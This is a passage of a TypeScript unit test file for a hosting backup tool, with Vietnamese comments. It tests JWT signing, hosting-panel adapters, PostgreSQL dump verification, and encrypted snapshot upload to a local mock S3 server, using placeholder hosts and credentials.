    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });

    const jwt = createGoogleServiceAccountJwt(
      {
        client_email: 'nas-sync-bot@my-backup-proj.iam.gserviceaccount.com',
        private_key: privateKey.replace(/\n/g, '\\n'),
      },
      'https://www.googleapis.com/auth/drive.file',
      1_762_000_000
    );

    const parts = jwt.split('.');
    assert.equal(parts.length, 3);
    const headerObj = JSON.parse(
      Buffer.from(parts[0], 'base64url').toString('utf8')
    );
    const payloadObj = JSON.parse(
      Buffer.from(parts[1], 'base64url').toString('utf8')
    );
    assert.equal(headerObj.alg, 'RS256');
    assert.equal(
      payloadObj.iss,
      'nas-sync-bot@my-backup-proj.iam.gserviceaccount.com'
    );
    assert.equal(payloadObj.aud, 'https://oauth2.googleapis.com/token');
    assert.equal(payloadObj.exp - payloadObj.iat, 3600);

    const verifier = crypto.createVerify('RSA-SHA256');
    verifier.update(`${parts[0]}.${parts[1]}`, 'utf8');
    verifier.end();
    assert.equal(
      verifier.verify(publicKey, Buffer.from(parts[2], 'base64url')),
      true
    );
  });

  it('validates CyberPanel/HestiaCP/CloudPanel adapters, syncs Extended Hosting Extras, and verifies PostgreSQL .sql.zst dumps', async () => {
    const zlibMod = await import('node:zlib');

    // 1. Kiểm tra safe-names & adapter factory cho 3 panel mới
    for (const panel of ['CYBERPANEL', 'HESTIACP', 'CLOUDPANEL'] as const) {
      assert.equal(isValidPanelType(panel), true);
      assert.equal(
        validateServerConnectionFields({
          hostname: `vps-${panel.toLowerCase()}.example.com`,
          ipAddress: '103.221.220.250',
          sshUser: 'root',
          panelType: panel,
        }),
        null
      );

      const liveAdapter = getPanelAdapter({
        id: 1,
        hostname: 'live.example.com',
        ip_address: '103.221.220.250',
        ssh_port: 22,
        ssh_user: 'root',
        ssh_key_path: '',
        panel_type: panel,
        assigned_volume_id: null,
        bw_limit_kbps: 0,
        status: 'ONLINE',
        is_mock: 0,
        last_connected_at: null,
        notes: '',
        created_at: new Date().toISOString(),
      });
      assert.equal(liveAdapter.panelType, panel);

      const mockAdapter = getPanelAdapter({
        id: 2,
        hostname: 'mock.example.com',
        ip_address: '103.221.220.251',
        ssh_port: 22,
        ssh_user: 'root',
        ssh_key_path: '',
        panel_type: panel,
        assigned_volume_id: null,
        bw_limit_kbps: 0,
        status: 'ONLINE',
        is_mock: 1,
        last_connected_at: null,
        notes: '',
        created_at: new Date().toISOString(),
      });
      const discovered = await mockAdapter.discoverDomains({
        id: 2,
        hostname: 'mock.example.com',
        ip_address: '103.221.220.251',
        ssh_port: 22,
        ssh_user: 'root',
        ssh_key_path: '',
        panel_type: panel,
        assigned_volume_id: null,
        bw_limit_kbps: 0,
        status: 'ONLINE',
        is_mock: 1,
        last_connected_at: null,
        notes: '',
        created_at: new Date().toISOString(),
      });
      assert.ok(discovered.length >= 2);
      if (panel === 'HESTIACP') {
        assert.ok(
          discovered.some((d) =>
            d.databases.some((db) => db.engine === 'POSTGRESQL')
          ),
          'HestiaCP mock discovery must include a POSTGRESQL database'
        );
      }
    }

    // 2. Chạy toàn trình executeBackupJob trên HestiaCP Mock (có PostgreSQL .sql.zst + Mailboxes + Cronjobs + Vhosts)
    const db = getDb();
    const vol = db
      .prepare('SELECT id, mount_path FROM storage_volumes ORDER BY id ASC LIMIT 1')
      .get() as { id: number; mount_path: string };
    assert.ok(
      vol.mount_path.startsWith(tempRootDir),
      'Test storage volume must be isolated inside tempRootDir on both Linux and Windows'
    );

    const srvIns = db
      .prepare(
        `INSERT INTO servers
         (hostname, ip_address, ssh_port, ssh_user, panel_type, assigned_volume_id, is_mock, backup_mailboxes, backup_cronjobs, backup_vhost_configs)
         VALUES ('hestia-pg.example.com', '103.221.220.245', 22, 'root', 'HESTIACP', ?, 1, 1, 1, 1)`
      )
      .run(vol.id);
    const hestiaServerId = Number(srvIns.lastInsertRowid);

    const jobIns = db
      .prepare(
        `INSERT INTO backup_jobs (job_type, server_id, volume_id, snapshot_name, status)
         VALUES ('BACKUP', ?, ?, '2026-11-02_12-00', 'QUEUED')`
      )
      .run(hestiaServerId, vol.id);
    const hestiaJobId = Number(jobIns.lastInsertRowid);

    await executeBackupJob(hestiaJobId, { verifyDb: true });

    const completedJob = db
      .prepare('SELECT status, error_log FROM backup_jobs WHERE id = ?')
      .get(hestiaJobId) as { status: string; error_log: string | null };
    assert.equal(completedJob.status, 'COMPLETED');

    const snapshotDir = path.join(
      vol.mount_path,
      'hestia-pg.example.com',
      '2026-11-02_12-00'
    );

    // Kiểm tra Extended Hosting Extras (Mailboxes, Cronjobs, Vhosts) đã tạo đủ
    assert.equal(
      fs.existsSync(
        path.join(
          snapshotDir,
          'system_extras',
          'mailboxes',
          'saas-platform.vn',
          'Maildir',
          'cur',
          'welcome.eml'
        )
      ),
      true
    );
    assert.equal(
      fs.existsSync(
        path.join(
          snapshotDir,
          'system_extras',
          'cronjobs',
          'hestiausr.crontab'
        )
      ),
      true
    );
    assert.equal(
      fs.existsSync(
        path.join(
          snapshotDir,
          'system_extras',
          'vhosts',
          'saas-platform.vn.conf'
        )
      ),
      true
    );

    // Kiểm tra tất cả backup_items (bao gồm cả PostgreSQL .sql.zst) đều PASSED Sandbox Verification
    const items = db
      .prepare('SELECT domain_name, verification_status, databases_list FROM backup_items WHERE job_id = ?')
      .all(hestiaJobId) as Array<{
      domain_name: string;
      verification_status: string;
      databases_list: string;
    }>;
    assert.ok(items.length >= 2);
    for (const it of items) {
      assert.equal(it.verification_status, 'PASSED');
    }

    const pgDumpPath = path.join(
      snapshotDir,
      'home',
      'domains',
      'saas-platform.vn',
      'databases',
      'pg_hestiausr_pgdata.sql.zst'
    );
    assert.equal(fs.existsSync(pgDumpPath), true);
    const validPgRes = await verifyPostgresDumpFile(pgDumpPath);
    assert.equal(validPgRes.ok, true);
    assert.equal(validPgRes.tablesCount, 2);

    // Kiểm tra file .sql.zst thiếu trailer `PostgreSQL database dump complete` bị từ chối CORRUPTED
    const zlibZstd = zlibMod.default as typeof zlibMod.default & {
      zstdCompressSync?: (b: Buffer) => Buffer;
    };
    if (typeof zlibZstd.zstdCompressSync === 'function') {
      const brokenPgPath = path.join(tempRootDir, 'pg_truncated.sql.zst');
      fs.writeFileSync(
        brokenPgPath,
        zlibZstd.zstdCompressSync(
          Buffer.from(
            '-- PostgreSQL database dump\nCREATE TABLE public.t1 (id int);\n-- abruptly cut off without trailer',
            'utf8'
          )
        )
      );
      const brokenRes = await verifyPostgresDumpFile(brokenPgPath);
      assert.equal(brokenRes.ok, false);
      assert.match(brokenRes.error || '', /complete/i);
    }

    // Kiểm tra syncExtendedHostingExtras trả về 0 ngay lập tức khi tắt cả 3 cờ
    const zeroExtras = await syncExtendedHostingExtras({
      jobId: hestiaJobId,
      server: {
        id: hestiaServerId,
        hostname: 'hestia-pg.example.com',
        ip_address: '103.221.220.245',
        ssh_port: 22,
        ssh_user: 'root',
        ssh_key_path: '',
        panel_type: 'HESTIACP',
        assigned_volume_id: vol.id,
        bw_limit_kbps: 0,
        status: 'ONLINE',
        is_mock: 1,
        backup_mailboxes: 0,
        backup_cronjobs: 0,
        backup_vhost_configs: 0,
        last_connected_at: null,
        notes: '',
        created_at: new Date().toISOString(),
      },
      domains: [],
      inProgressDir: tempRootDir,
      latestSnapshotDir: null,
      appendLog: () => {},
    });
    assert.deepEqual(zeroExtras, { deltaBytes: 0, totalBytes: 0 });

    // 3. Kiểm tra đẩy Snapshot lên Mock S3 Offsite Cloud toàn trình (tar.gz -> AES-256-GCM -> S3 PUT + Prune)
    const httpMod = await import('node:http');
    const { Readable } = await import('node:stream');
    const { pipeline } = await import('node:stream/promises');

    let capturedPutKey = '';
    let capturedAuthHeader = '';
    let capturedEncryptedBody = Buffer.alloc(0);
    const deletedKeys: string[] = [];

    const mockS3Server = httpMod.createServer((req, res) => {
      const reqUrl = new URL(req.url || '/', 'http://127.0.0.1');
      if (req.method === 'PUT') {
        capturedPutKey = reqUrl.pathname;
        capturedAuthHeader = String(req.headers.authorization || '');
        const chunks: Buffer[] = [];
        req.on('data', (c: Buffer) => chunks.push(c));
        req.on('end', () => {
          capturedEncryptedBody = Buffer.concat(chunks);
          res.writeHead(200, { ETag: '"mock-etag-1"' });
          res.end();
        });
        return;
      }
      if (req.method === 'GET' && reqUrl.searchParams.get('list-type') === '2') {
        res.writeHead(200, { 'Content-Type': 'application/xml' });
        res.end(`<?xml version="1.0" encoding="UTF-8"?>
          <ListBucketResult>
            <IsTruncated>false</IsTruncated>
            <Contents>
              <Key>nas-sync/hestia-pg.example.com/nas-sync-hestia-pg.example.com-2026-01-01_00-00.tar.gz.enc</Key>
              <LastModified>2026-01-01T00:00:00.000Z</LastModified>
            </Contents>
            <Contents>
              <Key>nas-sync/hestia-pg.example.com/nas-sync-hestia-pg.example.com-2026-11-02_12-00.tar.gz.enc</Key>
              <LastModified>2026-11-02T12:00:00.000Z</LastModified>
            </Contents>
          </ListBucketResult>`);
        return;
      }
      if (req.method === 'DELETE') {
        deletedKeys.push(reqUrl.pathname);
        res.writeHead(204);
        res.end();
        return;
      }
      res.writeHead(404);
      res.end();
    });

    await new Promise<void>((resolve) =>
      mockS3Server.listen(0, '127.0.0.1', () => resolve())
    );
    const s3Addr = mockS3Server.address() as { port: number };

    try {
      setSettings({
        offsite_provider: 'S3_COMPATIBLE',
        offsite_s3_preset: 'R2',
        offsite_s3_endpoint: `http://127.0.0.1:${s3Addr.port}`,
        offsite_s3_region: 'auto',
        offsite_s3_bucket: 'vault-bucket',
        offsite_s3_prefix: 'nas-sync',
        offsite_s3_access_key: 'R2TESTACCESSKEY',
        offsite_s3_secret_key: 'R2TESTSECRETKEY',
        offsite_encryption_passphrase: 'Offsite-Vault-Secret-Passphrase!',
        offsite_keep_count: '1',
      });

      const connTest = await testOffsiteConnection({
        offsite_s3_secret_key: '••••••••', // Phải bỏ qua chuỗi mask và lấy secret thật từ DB!
      });
      assert.equal(connTest.ok, true);
      assert.equal(connTest.providerLabel, 'Cloudflare R2');

      const offsiteJob = await pushSnapshotToOffsiteCloud(hestiaJobId, {
        triggerSource: 'UNIT_TEST',
      });
      assert.equal(offsiteJob.status, 'COMPLETED');
      assert.ok(offsiteJob.encrypted_size_bytes > 45);
      assert.match(capturedAuthHeader, /^AWS4-HMAC-SHA256 Credential=R2TESTACCESSKEY\//);
      assert.match(
        capturedPutKey,
        /^\/vault-bucket\/nas-sync\/hestia-pg\.example\.com\/nas-sync-hestia-pg\.example\.com-2026-11-02_12-00\.tar\.gz\.enc$/
      );
      // keep_count = 1 -> bản cũ 2026-01-01 tự động bị xóa prune
      assert.equal(deletedKeys.length, 1);
      assert.match(deletedKeys[0], /2026-01-01_00-00\.tar\.gz\.enc$/);

      // Giải mã ngược luồng S3 đã tải lên -> phải ra đúng luồng Gzip hợp lệ (magic 0x1f 0x8b)
      const decryptedTarGzChunks: Buffer[] = [];
      const dec = createOffsiteDecryptStream('Offsite-Vault-Secret-Passphrase!');
      dec.on('data', (c: Buffer) => decryptedTarGzChunks.push(c));
      await pipeline(Readable.from([capturedEncryptedBody]), dec);
      const tarGzBuf = Buffer.concat(decryptedTarGzChunks);
      assert.equal(tarGzBuf[0], 0x1f);
      assert.equal(tarGzBuf[1], 0x8b);
    } finally {
      setSettings({ offsite_provider: 'NONE' });
      await new Promise<void>((resolve) => mockS3Server.close(() => resolve()));
    }
  });
});
